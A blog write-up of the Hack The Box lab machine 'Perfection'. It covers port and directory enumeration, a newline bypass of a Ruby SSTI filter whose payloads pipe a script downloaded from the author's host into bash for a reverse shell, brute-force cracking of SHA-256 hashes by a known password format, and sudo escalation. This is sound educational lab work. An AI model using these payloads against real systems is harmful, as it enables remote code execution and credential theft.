---
title: "HTB Writeup: Perfection"
author: xpnt
date: 2024-07-08
image:
  path: https://raw.githubusercontent.com/xpnt0/xpnt0.github.io/master/assets/images/HTB-Writeup-Perfection/perfection.jfif
  height: 1500
  width: 500
categories: [Hack The Box, "Season 4: Savage Lands"]
tags: [labs,openfire,jabber,xmpp,ASREProasting,pidgin]
---

# Writeup

- [Link: Pwned Date](https://www.hackthebox.com/achievement/machine/1504363/590)

## Description 

- Perfection is an easy Linux machine that features a web application with functionality to calculate student scores. This application is vulnerable to Server-Side Template Injection (SSTI) via regex filter bypass. A foothold can be gained by exploiting the SSTI vulnerability. Enumerating the user reveals they are part of the `sudo` group. Further enumeration uncovers a database with password hashes, and the user's mail reveals a possible password format. Using a mask attack on the hash, the user's password is obtained, which is leveraged to gain `root` access.

## Enumeration

- The pentester starts with a port scan and discovers that the ports `22,80` are open. 

```python
# Nmap 7.94SVN scan initiated Thu Mar 21 20:08:18 2024 as: nmap -sCV -v -n -Pn -p22,80 -oN scanPorts 10.10.11.253
Nmap scan report for 10.10.11.253
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar 21 20:08:30 2024 -- 1 IP address (1 host up) scanned in 11.58 seconds
```

- The pentester began by analyzing the website on port 80 and discovered it was a portal that allowed users to calculate the total grade in a class based on category scores and percentage weights.

![](/assets/images/HTB-Writeup-Perfection/Pasted image 20240708100449.png)


- The pentester also noticed that the website was using `Ruby 3.0.2`, as detected by the `Wappalyzer` add-on.

![](/assets/images/HTB-Writeup-Perfection/Pasted image 20240708101223.png)

- Since it's a CTF, it's always a good idea to conduct fuzzing to search for background routes. However, this time, the pentester didn't find anything interesting.

```bash
❯ gobuster dir -u http://10.10.11.253 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 200  -r
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.253
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 3827]
Progress: 207643 / 207644 (100.00%)
===============================================================
Finished
===============================================================
```

- Without a doubt, the functionality to calculate the total grade (`/weighted-grade`) was a utility that deserved thorough analysis for vulnerabilities. Therefore, the pentester dedicated time to understanding its operation.

![](/assets/images/HTB-Writeup-Perfection/Pasted image 20240708101319.png)

- This functionality operated as a calculator for your weighted grade, requiring the sum of the weights to be 100. It would then provide a report listing the categories previously specified, along with the percentage of each category that contributed to the total grade.

![](/assets/images/HTB-Writeup-Perfection/Pasted image 20240708101729.png)


![](/assets/images/HTB-Writeup-Perfection/Pasted image 20240708101948.png)

- This was a perfect scenario to attempt exploiting an SSTI (Server-Side Template Injection) in Ruby. However, the pentester noticed a filter that invalidated the POST request upon attempting to input the `<` character, thereby preventing the exploitation.

![](/assets/images/HTB-Writeup-Perfection/Pasted image 20240708102323.png)


## User

- At this point, the pentester searched for ways to bypass SSTI filters and found David Hamann's post, where he mentions how a misunderstanding of regular expressions in Ruby could result in creating an inefficient filter that fails to protect against SSTI attacks. In that scenario, he describes that it's possible to bypass the bad filter using a newline character (`%0a`). Therefore, assuming the developer implemented a flawed filter to prevent SSTI attacks, the pentester attempted to add a newline character (`%0a`), successfully exploiting SSTI in Ruby

```sh
math%0a<%25%3d+system('curl+http://10.10.14.123:44/RubySSTITesting')+%25>
```

![](/assets/images/HTB-Writeup-Perfection/Pasted image 20240708103732.png)

![](/assets/images/HTB-Writeup-Perfection/Pasted image 20240708103624.png)

- The pentester obtained a reverse shell using the following payload, noting that he accessed it as the user 'susan'.

```sh
10%0a<%25%3d+system('curl+http://10.10.14.123:44/rev+|+bash')+%25>
```

![](/assets/images/HTB-Writeup-Perfection/Pasted image 20240708001422.png)
![](/assets/images/HTB-Writeup-Perfection/Pasted image 20240708001443.png)

- Reading `user.txt`

```bash
susan@perfection:~$ cat user.txt
e3bcde74d0631f04e9a455496eda8f83
```

## Root
- Basic enumeration allowed the pentester to notice that the user 'susan' belongs to the 'sudo' group. Therefore, to achieve privilege escalation, it was sufficient to find Susan's password.

```bash
susan@perfection:~$ id
uid=1001(susan) gid=1001(susan) groups=1001(susan),27(sudo)
```

- After enumerating the home directory of the user 'susan', the pentester noticed the presence of an SQLite database file named `pupilpath_credentials.db`.

![](/assets/images/HTB-Writeup-Perfection/Pasted image 20240708001904.png)

 - The pentester accessed the SQLite database and retrieved password hashes that were stored in the `users` table.

![](/assets/images/HTB-Writeup-Perfection/Pasted image 20240708065809.png)

- Since attempting to crack the passwords offline using a password wordlist like `rockyou.txt` and others didn't yield results, and considering it's a CTF scenario, the pentester then proceeded to enumerate files owned by the user 'susan' in search of more clues. However, he didn't find anything interesting.

```bash
find / \( -path /proc -prune \) -o \( -path /sys -prune \) -o \( -path /run -prune \) -o -user susan -exec ls -ldah {} \; 2>/dev/null

```

![](/assets/images/HTB-Writeup-Perfection/Pasted image 20240708074019.png)

- While it's true that he didn't find files directly owned by the user 'susan', there's a possibility that there are files owned by the group 'susan' which might also be readable by the user 'susan'. The pentester proceeded to enumerate them and noted the existence of the file `/var/mail/susan`.

```bash
find / \( -path /proc -prune \) -o \( -path /sys -prune \) -o \( -path /run -prune \) -o -group susan -exec ls -ldah {} \; 2>/dev/null
```

![](/assets/images/HTB-Writeup-Perfection/Pasted image 20240708073922.png)

- The content of `/var/mail/susan` is a message from Tina to Susan, essentially informing her that due to a data breach, a new password format has been suggested. The format consists of `{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}`.

```bash
susan@perfection:~/Migration$ cat /var/mail/susan
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```


- With that in mind, it's likely that the password hashes come from passwords that adhere to this specification. Therefore, the pentester created a script for` offline password cracking`.

```python
import hashlib

names = ['susan', 'tina','harry','david','stephen']
hashes = [
          'abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f',
          'dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57',
          'd33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393',
          'ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a',
          '154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8'
          ]

def back_name(name):
    return name[::-1]

for i in range(len(names)):
    name = names[i]
    for j in range(1, 1000000001):
        password = name +"_" + back_name(name) + "_" + str(j)
        phash = hashlib.sha256(password.encode()).hexdigest()

        if phash == hashes[i]:
            print(f"[+] The user {name}'s password is {password}")
            break
            
```

 - Upon running the Python 3 script, the pentester discovered the plaintext passwords for multiple users.

![](/assets/images/HTB-Writeup-Perfection/Pasted image 20240708092621.png)
```
[+] The user susan's password is susan_nasus_413759210
[+] The user tina's password is tina_anit_916066225
[+] The user harry's password is harry_yrrah_782072564
[+] The user david's password is david_divad_274797280
[+] The user stephen's password is stephen_nehpets_609653958
```

- Supposing there was `password reuse`, the pentester sought to validate the credentials of the user `susan` by attempting an `SSH` connection to the target. Success! The pentester managed to connect via `SSH`, thus validating the credential `susan_nasus_413759210`.

```bash
sshpass -p 'susan_nasus_413759210' ssh susan@10.10.11.253
```

![](/assets/images/HTB-Writeup-Perfection/Pasted image 20240708104613.png)

- The pentester enumerated the sudo rights after obtaining `susan's password`, discovering that the user '`susan`' could execute **ALL commands on the target as any user in any group**, effectively becoming an easy win for privilege escalation to root. This assumption was based on susan belonging to the `sudo group`. A classic option to escalate to root would be to execute the command `sudo su`. This allowed him to read the `root.txt` file.

![](/assets/images/HTB-Writeup-Perfection/Pasted image 20240708105712.png)


>I hope you had as much fun reading this write up as I did writing it. If this writeup helped you, please feel free to go to my [`Hack The Box profile (xpnt)`](https://app.hackthebox.com/users/1504363) and give me a respect 😁. Happy Hacking!!👾
{: .prompt-tip }